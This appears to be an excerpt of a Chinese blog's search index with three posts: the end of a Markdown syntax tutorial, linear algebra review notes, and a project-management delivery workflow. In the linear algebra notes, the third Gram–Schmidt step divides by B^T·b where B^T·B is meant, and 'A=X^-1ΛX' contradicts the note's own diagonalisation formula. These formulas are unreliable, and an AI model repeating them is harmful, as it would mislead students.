<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>

<p>显示效果：</p>
<ul>
<li>无序列表一</li>
<li>无序列表二</li>
<li>无序列表三</li>
</ul>
<p><strong>有序列表的表示</strong></p>
<p>直接用一个数字和英文句点就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. balabala</span><br><span class="line">2. balabala</span><br><span class="line">3. balabala</span><br></pre></td></tr></table></figure>

<p>显示效果：</p>
<ol>
<li>有序列表一</li>
<li>有序列表二</li>
<li>有序列表三</li>
</ol>
<h5 id="包含引用（虽然我感觉没啥用2333）"><a href="#包含引用（虽然我感觉没啥用2333）" class="headerlink" title="包含引用（虽然我感觉没啥用2333）"></a>包含引用（虽然我感觉没啥用2333）</h5><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>

<p>效果：</p>
<ul>
<li><p>阅读的方法</p>
<blockquote>
<p>打开电灯<br>打开书本</p>
</blockquote>
</li>
</ul>
<h5 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>

<p>emmm,自己注意一下</p>
<ol>
<li>1986. what a  great season.</li>
</ol>
<h1 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h1><p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>

<p>效果：$E=mc^2$</p>
<p>数学符号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尖括号:\langle</span><br><span class="line">上取整:\lceil</span><br><span class="line">下取整:\lfloor</span><br><span class="line">分数:\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">求和:\sum</span><br><span class="line">积分:\int_&#123;下限&#125;^&#123;\infty&#125;后面的括号表示上限，\infty表示无限</span><br><span class="line">极限:\lim_&#123;x\to+\infty&#125;</span><br></pre></td></tr></table></figure>

<p>极限的效果：$\lim_{x\to +\infty}$</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>语法</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>线代预习一些知识</title>
    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
<span id="more"></span>

<ul>
<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
</li>
<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
</li>
<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
<li><p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
</li>
<li><p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
</li>
<li><p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
</ul>
<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
<ol>
<li><p>$$|2*A|=2^n*x$$</p>
</li>
<li><p>$$|-A|=(-1)^n*x$$</p>
</li>
<li><p>$$|A^2|=x^2$$</p>
</li>
<li><p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
</li>
</ol>
<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
<p>矩阵可逆可推出列空间是$R^3$</p>
<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
<p>列空间的维数是他的秩</p>
<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>$$A^-1=\frac{C\tau}{|A|}$$</p>
<p>$$A*C\tau=|A|*I$$</p>
<h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
<p>特征值的乘积等于矩阵的行列式</p>
<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
<p>X则是特征向量的集合的矩阵</p>
<p>A是原矩阵</p>
<p>有公式：</p>
<p>$$\Lambda=X^-1*A*X$$ </p>
<p>$$A=X^-1*\Lambda*X$$ </p>
]]></content>
      <categories>
        <category>大一课程</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>项目管理实施流程</title>
    <url>/2022/08/02/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%AE%9E%E6%96%BD%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p> 项目管理实施流程</p>
<span id="more"></span>

<p>项目成功=项目验收+客户成功</p>
<ul>
<li>项目验收-&gt;合适的解决方案+成功的实施方法+可控的交付成果</li>
<li>客户成功-&gt;满足需求+解决痛点+体现业务价值</li>
</ul>
<h4 id="项目评估分级"><a href="#项目评估分级" class="headerlink" title="项目评估分级"></a>项目评估分级</h4><p>A级:满足以下其中一个条件即可</p>
<ul>
<li><strong>董事局，风控领导，甲方集团总裁</strong>重点关注</li>
<li><strong>客户需求与公司重点产品孵化方向强相关</strong></li>
<li>项目金额&gt;=200万元</li>
<li>是客户<strong>核心业务必备系统</strong></li>
</ul>
<p>B级：从以下维度进行综合评估</p>
<ul>
<li><strong>前台信息化负责人</strong>重点考核事项</li>
<li><strong>甲方集团业务管线总</strong>重点关注</li>
<li>项目金额&gt;=100万元</li>
<li>是客户<strong>核心业务必备系统</strong></li>
</ul>
<p>C级：</p>
<ul>
<li>项目金额&lt;100万元</li>
<li>非客户核心业务必备系统</li>
</ul>
<p>资源冲突时优先<strong>高等级项目</strong>，同等级冲突时需要<strong>重新对项目进行评估</strong></p>
<h4 id="项目管理总体框架体系"><a href="#项目管理总体框架体系" class="headerlink" title="项目管理总体框架体系"></a>项目管理总体框架体系</h4><p>项目启动：<strong>《项目报价单》必须经过公司领导审批确认后才能发给客户</strong>，</p>
<p>规划及方案：《未签合同提前开工委托单》：如因特殊情况未能在项目投入开发资源前<strong>签订项目合同，须在投入开发资源前签订提前开工委托单（须签署至业务管线总，IT负责人）</strong>，<em><strong>工作范围，工作量和报价确认</strong></em>这几个方面很重要。</p>
<p>公司管控红线：</p>
<ol>
<li>PPR项目/PER需求  未走规定手续不允许上线</li>
<li>PER需求工作量未经集团IT确认，不允许开发</li>
<li>项目过程所有文档均按制度进行归档</li>
<li>需求评估后，费用金额超30万或支付周期超2个月，须以PPR形式签署合同执行。</li>
</ol>
<h4 id="项目启动"><a href="#项目启动" class="headerlink" title="项目启动"></a>项目启动</h4><h5 id="项目分级"><a href="#项目分级" class="headerlink" title="项目分级"></a>项目分级</h5><ul>
<li>获取用户提出的需求—–了解项目需求范围边界，了解重点难点—–形成待确认事项CheckList—–</li>
<li>项目分级—-PMO进行分级</li>
</ul>
<h5 id="需求调研"><a href="#需求调研" class="headerlink" title="需求调研"></a>需求调研</h5><ul>
<li>客户见面会—待明确的事项，准备要和客户进行商议的事项</li>
<li>需求调研—-制定调研方案和计划—-需求调研对象应覆盖到业务，业务管线总，信息化人员</li>
</ul>
<p>关于调研：</p>
<ul>
<li>充分准备</li>
<li>情商在线</li>
<li>带有尊重</li>
<li>形成报告</li>
</ul>
<p>在调研报告中要从5个方面对客户的现状进行分析：<strong>用户分析，业务分析，权责流程，报表，主数据</strong></p>
<p>在TOBE中要体现四个方面：<strong>业务的提升，流程的提升，关键管控点变化和报表的变化</strong></p>
<h5 id="项目立项"><a href="#项目立项" class="headerlink" title="项目立项"></a>项目立项</h5><ul>
<li>需求报价—-《项目报价单》需报中心，公司负责人审批确认后才能交到客户</li>
<li>项目立项—-由前台IT发起项目立项会审</li>
</ul>
<h5 id="项目启动-1"><a href="#项目启动-1" class="headerlink" title="项目启动"></a>项目启动</h5><ul>
<li>客户高层访谈—–<strong>重要</strong>，做好准备—-每个问题答案描述有效—–了解高层核心需求—-</li>
<li>项目规划方案评审（内部）</li>
<li>项目规划方案汇报</li>
<li>项目启动会—实施目标来源于确认的项目目标和业务价值—-整体规划包含实施策略，实施范围，里程碑计划，双方项目团队</li>
<li>项目核心成员组建——遵循项目分级评估及资源部署表中的原则。</li>
</ul>
<h5 id="合同签署"><a href="#合同签署" class="headerlink" title="合同签署"></a>合同签署</h5><p>完成合同签署资料准备，发起合同会签</p>
<h4 id="规划及方案"><a href="#规划及方案" class="headerlink" title="规划及方案"></a>规划及方案</h4><h5 id="需求详细分析"><a href="#需求详细分析" class="headerlink" title="需求详细分析"></a>需求详细分析</h5><ul>
<li>核心业务场景分析——找出客户关键应用需求——-解决方案专家找到客户核心业务场景</li>
<li>业务解决方案—–及时摆出各种情况，项目组内部先确定，再和客户确定—–及时向客户高层汇报，勇于披露问题</li>
</ul>
<h5 id="需求方案评审"><a href="#需求方案评审" class="headerlink" title="需求方案评审"></a>需求方案评审</h5><ul>
<li>需求方案评审（内部）—–内部评审后再交到客户，评审需求可行性，合规性</li>
<li>需求方案确认—–《需求分析说明书》必须签字至客户方业务第一负责人及IT负责人</li>
</ul>
<h5 id="项目排期"><a href="#项目排期" class="headerlink" title="项目排期"></a>项目排期</h5><ul>
<li>项目团队成员更新—–更新团队人员，明确职责分工</li>
<li>项目进度计划编写—-<strong>工作量评估以及预估费用为提前开工单必须字段</strong></li>
</ul>
<h5 id="开发设计"><a href="#开发设计" class="headerlink" title="开发设计"></a>开发设计</h5><ul>
<li>开发设计方案编写</li>
<li>开发设计方案评审</li>
</ul>
<h5 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h5><ul>
<li>测试用户评审</li>
</ul>
<h4 id="开发及SIT"><a href="#开发及SIT" class="headerlink" title="开发及SIT"></a>开发及SIT</h4><h5 id="服务器部署"><a href="#服务器部署" class="headerlink" title="服务器部署"></a>服务器部署</h5><ul>
<li>服务器部署——在客户需求方案阶段输出服务器配置方案给到客户</li>
</ul>
<h5 id="开发编码"><a href="#开发编码" class="headerlink" title="开发编码"></a>开发编码</h5><ul>
<li>开发编码</li>
<li>开发自测</li>
<li>开发组长代码走查</li>
</ul>
<h5 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h5><ul>
<li>集成测试—-确保业务闭环</li>
<li>测试分析总结—–客户关键业务场景测试结果分析，以及后续上线沟通方案</li>
<li>SIT评审—-通过后签署《SIT测试报告》，签字人包括测试，项目经理，中心领导，公司领导，评审通过后再进行UAT</li>
</ul>
<h4 id="UAT及上线"><a href="#UAT及上线" class="headerlink" title="UAT及上线"></a>UAT及上线</h4><h5 id="系统UAT测试"><a href="#系统UAT测试" class="headerlink" title="系统UAT测试"></a>系统UAT测试</h5><ul>
<li>实施验收测试—-客户UAT测试之前，项目经理需先完成实施验收测试</li>
<li>系统UAT测试—-《UAT测试验收报告》：客户UAT测试通过后，签字至客户业务线第一负责人及IT负责人</li>
</ul>
<p><strong>UAT测试前的准备事项</strong></p>
<ol>
<li>项目经理对交付功能进行初步验收</li>
<li>测试用例的准备</li>
<li>数据初始化</li>
<li>UAT测试计划</li>
<li>UAT测试前的培训指导</li>
<li>测试的账号</li>
</ol>
<p><strong>UAT测试过程中的注意事项</strong></p>
<ol>
<li>选择合适的UAT测试开展方式</li>
<li>创建《测试问题跟踪表》登记问题</li>
<li>推动测试进度，必要时辅助客户</li>
<li>问题处理—-问题分类处理，与业务沟通</li>
<li>签署测试报告</li>
</ol>
<h5 id="上线培训"><a href="#上线培训" class="headerlink" title="上线培训"></a>上线培训</h5><ul>
<li>上线培训—–培训ppt通过审核，项目组内部可试讲</li>
</ul>
<h5 id="上线准备"><a href="#上线准备" class="headerlink" title="上线准备"></a>上线准备</h5><ul>
<li>上线规划方案评审—-甲乙方共同制定系统上线策略及切换计划，明确需要完成的事项—-各领域规定一名核心用户为内部专家</li>
<li>上线启动会—-《未签合同提前上线申请单》：PPR项目上线时未签订合同，需签提前上线申请单</li>
<li>上线数据准备—-输出业务初始化数据（<strong>确认版</strong>）</li>
</ul>
<p><strong>上线规划方案</strong></p>
<ol>
<li>围绕上线目标</li>
<li>明确上线组织范围，功能范围，时间计划</li>
<li>包含最终用户方案，体现准出法则：系统的测试结果和培训情况</li>
<li>包含系统初始化方案，数据迁移方案，同时有对上线切换策略明确规定</li>
<li>风险应对策略，形成风险登记册</li>
<li>有线上保障机制—–甲乙双方上线资源保障及分工—–上线问题跟踪记录表</li>
</ol>
<h5 id="系统试点上线"><a href="#系统试点上线" class="headerlink" title="系统试点上线"></a>系统试点上线</h5><ul>
<li>准备正式环境</li>
<li>系统初始化</li>
<li>上线通知发布</li>
</ul>
<h4 id="实施推广"><a href="#实施推广" class="headerlink" title="实施推广"></a>实施推广</h4><h5 id="系统上线试运行"><a href="#系统上线试运行" class="headerlink" title="系统上线试运行"></a>系统上线试运行</h5><ul>
<li>试运行—-上线问题跟踪处理，上线使用情况分析—–上线后两周内项目经理每日配合甲方跟进处理系统运行问题并发出系统运行日报</li>
</ul>
<h5 id="推广方案"><a href="#推广方案" class="headerlink" title="推广方案"></a>推广方案</h5><ul>
<li>推广方案—–共同制定计划，组织分工，包含培训计划，数据准备</li>
<li>运维接入—-转接运维</li>
</ul>
<h5 id="上线切换"><a href="#上线切换" class="headerlink" title="上线切换"></a>上线切换</h5><ul>
<li>推广动员大会</li>
<li>最终用户培训</li>
<li>数据准备—–初始化数据保密</li>
<li>上线初始化——和测试环境一致</li>
<li>上线切换</li>
</ul>
<h4 id="项目验收"><a href="#项目验收" class="headerlink" title="项目验收"></a>项目验收</h4><h5 id="项目验收-1"><a href="#项目验收-1" class="headerlink" title="项目验收"></a>项目验收</h5><ul>
<li>内部验收评审会—-检查项目验收标准—-项目平稳运行3个月可以开始验收</li>
<li>验收总结会议—-项目验收报告需签字至甲方业务管线总及IT负责人</li>
</ul>
<p><strong>验收总结汇报PPT</strong></p>
<ol>
<li>体现系统给客户带来的价值</li>
<li>整体回顾中包含项目背景，项目目标和项目里程碑的完成节点</li>
<li>展示包含核心场景的兑现效果</li>
<li>包含困难及应对，团队表彰和项目总结</li>
</ol>
<h5 id="运维交接"><a href="#运维交接" class="headerlink" title="运维交接"></a>运维交接</h5><ul>
<li>实施转运维交接—–明确遗留问题清单及计划</li>
</ul>
<h5 id="项目复盘总结"><a href="#项目复盘总结" class="headerlink" title="项目复盘总结"></a>项目复盘总结</h5><ul>
<li>项目复盘总结</li>
<li>产品运营</li>
</ul>
<p><strong>项目复盘ppt</strong></p>
<ol>
<li>围绕支付策略，应用效果，经验教训和成果提炼</li>
<li>包含与客户达成共识的项目目标和整体解决方案，内部达成共识的项目实施路径图</li>
<li>对于核心场景截图说明</li>
<li>经验教训总结，包含<strong>进度</strong>，<strong>成本</strong>，<strong>风险</strong>，<strong>质量</strong>和<strong>客户满意度</strong>五个方面</li>
</ol>
]]></content>
  </entry>
</search>
